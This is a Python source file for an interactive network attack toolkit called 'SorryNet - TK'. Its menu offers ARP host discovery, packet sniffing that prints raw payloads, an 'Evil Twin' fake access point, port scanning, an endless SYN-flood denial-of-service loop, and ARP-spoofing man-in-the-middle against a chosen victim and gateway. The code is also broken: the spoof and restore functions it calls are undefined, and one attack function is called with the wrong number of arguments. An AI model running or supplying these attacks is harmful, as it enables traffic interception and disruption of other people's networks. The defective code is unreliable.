import os
import time
import subprocess
import threading
from colorama import Fore, init
import scapy.all as scapy
import socket
from concurrent.futures import ThreadPoolExecutor
import ssl
import requests

init(autoreset=True)

def scan_network():
    print(Fore.YELLOW + "[+] Scanning the network...")
    try:
        arp_request = scapy.ARP(pdst="192.168.1.1/24")
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        
        if not answered_list:
            print(Fore.RED + "[!] No devices found.")
        
        for element in answered_list:
            print(Fore.GREEN + f"IP: {element[1].psrc}, MAC: {element[1].hwsrc}")
    except Exception as e:
        print(Fore.RED + f"[!] Error during network scan: {e}")

def packet_callback(packet):
    try:
        if packet.haslayer(scapy.IP):
            ip_src = packet[scapy.IP].src
            ip_dst = packet[scapy.IP].dst
            protocol = packet[scapy.IP].proto

            print(Fore.GREEN + f"Captured Packet: {ip_src} -> {ip_dst} | Protocol: {protocol}")

            if packet.haslayer(scapy.TCP):
                tcp_sport = packet[scapy.TCP].sport
                tcp_dport = packet[scapy.TCP].dport
                print(Fore.YELLOW + f"TCP Packet: Src Port: {tcp_sport} Dst Port: {tcp_dport}")
            
            elif packet.haslayer(scapy.UDP):
                udp_sport = packet[scapy.UDP].sport
                udp_dport = packet[scapy.UDP].dport
                print(Fore.YELLOW + f"UDP Packet: Src Port: {udp_sport} Dst Port: {udp_dport}")

            elif packet.haslayer(scapy.IPv6):
                ip6_src = packet[scapy.IPv6].src
                ip6_dst = packet[scapy.IPv6].dst
                print(Fore.YELLOW + f"IPv6 Packet: Src: {ip6_src} Dst: {ip6_dst}")
            
            if packet.haslayer(scapy.Raw):
                raw_data = packet[scapy.Raw].load
                print(Fore.MAGENTA + f"Raw Data: {raw_data}")
    except Exception as e:
        print(Fore.RED + f"[!] Error in packet callback: {e}")

def sniff_packets(interface):
    try:
        print(Fore.YELLOW + "[+] Starting packet sniffing...")
        scapy.sniff(iface=interface, prn=packet_callback, store=0)
    except PermissionError:
        print(Fore.RED + "[!] Permission denied. Try running as root (sudo).")
    except Exception as e:
        print(Fore.RED + f"[!] Error while sniffing packets: {e}")

def enable_monitor_mode(interface):
    try:
        print(Fore.YELLOW + "[+] Enabling monitor mode...")
        subprocess.call(["sudo", "ip", "link", "set", interface, "down"])
        subprocess.call(["sudo", "iw", interface, "set", "type", "monitor"])
        subprocess.call(["sudo", "ip", "link", "set", interface, "up"])
    except Exception as e:
        print(Fore.RED + f"[!] Error enabling monitor mode: {e}")

def disable_monitor_mode(interface):
    try:
        print(Fore.YELLOW + "[+] Disabling monitor mode...")
        subprocess.call(["sudo", "ip", "link", "set", interface, "down"])
        subprocess.call(["sudo", "iw", interface, "set", "type", "managed"])
        subprocess.call(["sudo", "ip", "link", "set", interface, "up"])
    except Exception as e:
        print(Fore.RED + f"[!] Error disabling monitor mode: {e}")

def start_fake_ap(target_ssid, interface):
    print(Fore.RED + "[!] Starting Evil Twin Attack (Fake AP)...")
    try:
        subprocess.call(["sudo", "hostapd", "-B", "/etc/hostapd/hostapd.conf"])
        subprocess.call(["sudo", "dnsmasq", "-C", "/etc/dnsmasq.conf"])
        print(Fore.GREEN + f"[+] Fake AP '{target_ssid}' is now running on {interface}. Devices will be tricked into connecting.")
    except Exception as e:
        print(Fore.RED + f"[!] Error starting Fake AP: {e}")

def stop_fake_ap():
    print(Fore.RED + "[!] Stopping Fake AP...")
    try:
        subprocess.call(["sudo", "killall", "hostapd"])
        subprocess.call(["sudo", "killall", "dnsmasq"])
    except Exception as e:
        print(Fore.RED + f"[!] Error stopping Fake AP: {e}")

def evil_twin_attack(target_ssid, interface):
    enable_monitor_mode(interface)
    start_fake_ap(target_ssid, interface)
    time.sleep(60)
    stop_fake_ap()
    disable_monitor_mode(interface)

def scan_port(target, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            result = s.connect_ex((target, port))
            if result == 0:
                print(Fore.GREEN + f"Port {port} is OPEN")
            else:
                print(Fore.RED + f"Port {port} is CLOSED")
    except socket.error as e:
        print(Fore.RED + f"Error scanning port {port}: {e}")

def scan_ports(target, ports):
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(lambda port: scan_port(target, port), ports)

def port_scan(target):
    ports = range(20, 1025)
    print(Fore.RED + f"Scanning {target} for open ports...")
    scan_ports(target, ports)

def ssl_check(target):
    print(Fore.YELLOW + f"[+] Checking SSL/TLS certificate for {target}...")
    try:
        context = ssl.create_default_context()
        with context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=target) as s:
            s.connect((target, 443))
            cert = s.getpeercert()
            if cert:
                print(Fore.GREEN + f"Certificate for {target}: Valid")
                print(Fore.YELLOW + f"Certificate Details:")
                for field, value in cert.items():
                    print(Fore.CYAN + f"{field}: {value}")
            else:
                print(Fore.RED + f"No SSL/TLS certificate found for {target}")
    except Exception as e:
        print(Fore.RED + f"Error checking SSL for {target}: {e}")

def wifi_scan():
    print(Fore.YELLOW + "[+] Scanning nearby Wi-Fi networks...")
    if os.name == 'posix': 
        try:
            networks = subprocess.check_output(["sudo", "iwlist", "wlan0", "scan"])
            networks = networks.decode("utf-8").split("\n")
            for line in networks:
                if "ESSID" in line:
                    ssid = line.split(":")[1].strip().strip('"')
                    print(Fore.GREEN + f"Found Network: {ssid}")
        except subprocess.CalledProcessError as e:
            print(Fore.RED + "Error scanning Wi-Fi networks, make sure you're on a Linux system with iwlist.")
    else:
        print(Fore.RED + "Wi-Fi scanning is only supported on Linux.")

def dos_attack(target_ip):
    print(Fore.RED + "[!] Starting SYN Flood DoS Attack (use responsibly)...")
    try:
        while True:
            scapy.send(scapy.IP(dst=target_ip)/scapy.TCP(dport=80, flags="S"), verbose=False)
            print(Fore.RED + f"Sending SYN packets to {target_ip}...")
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(Fore.GREEN + "[+] DoS Attack stopped.")

def arp_spoofing():
    print(Fore.YELLOW + "[+] ARP Spoofing Attack: Man-in-the-Middle Attack")
    target_ip = input(Fore.CYAN + "Enter the target IP (victim): ")
    gateway_ip = input(Fore.CYAN + "Enter the gateway IP (router): ")

    try:
        print(Fore.RED + "[!] Starting ARP Spoofing...")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            print(Fore.YELLOW + f"Sending ARP Spoofing packets: {target_ip} <--> {gateway_ip}")
            time.sleep(2)
    except KeyboardInterrupt:
        print(Fore.GREEN + "[+] Stopping ARP Spoofing and restoring the network...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

def main_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.CYAN + """
                                         ======================================
                                                      SorryNet - TK
                                         ======================================
                                         1. Scan Network for Devices
                                         2. Sniff Network Traffic
                                         3. Start Evil Twin Attack (Linux)
                                         4. Scan Open Ports
                                         5. Check SSL/TLS Certificates
                                         6. Scan Nearby Wi-Fi Networks (Linux)
                                         7. Start DoS Attack
                                         8. Start ARP Spoofing Attack
                                         9. Exit
                                         ======================================
        """)
        choice = input(Fore.YELLOW + "|----->$: ")
        if choice == "1":
            scan_network()
            input(Fore.YELLOW + "Press Enter to return to the menu...")
        elif choice == "2":
            interface = input(Fore.CYAN + "Ethernet + Wi-Fi, Press Enter To Sniff... ")
            sniff_packets(interface)
            input(Fore.YELLOW + "Press Enter to return to the main menu...")
        elif choice == "3":
            target_ssid = input(Fore.CYAN + "Enter the target SSID (router name): ")
            gateway_ip = input(Fore.CYAN + "Enter the gateway IP address (router): ")
            interface = input(Fore.CYAN + "Enter your Wi-Fi interface (e.g., wlan0): ")
            evil_twin_attack(target_ssid, gateway_ip, interface)
        elif choice == "4":
            target = input(Fore.BLUE + "Enter the target IP or domain to scan: ")
            port_scan(target)
            input(Fore.YELLOW + "Press Enter to return to the main menu...")
        elif choice == "5":
            target = input(Fore.BLUE + "Enter the target IP or domain to check SSL: ")
            ssl_check(target)
            input(Fore.YELLOW + "Press Enter to return to the main menu...")
        elif choice == "6":
            wifi_scan()
            input(Fore.YELLOW + "Press Enter to return to the main menu...")
        elif choice == "7":
            target_ip = input(Fore.RED + "Enter the target IP for DoS attack: ")
            dos_attack(target_ip)
            input(Fore.YELLOW + "Press Enter to return to the main menu...")
        elif choice == "8":
            arp_spoofing()
        elif choice == "9":
            os.system('clear')
            print(Fore.LIGHTGREEN_EX + "GOODBYE...")
            time.sleep(1)
            break
        else:
            print(Fore.RED + "Invalid choice. Please select a valid option.")
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
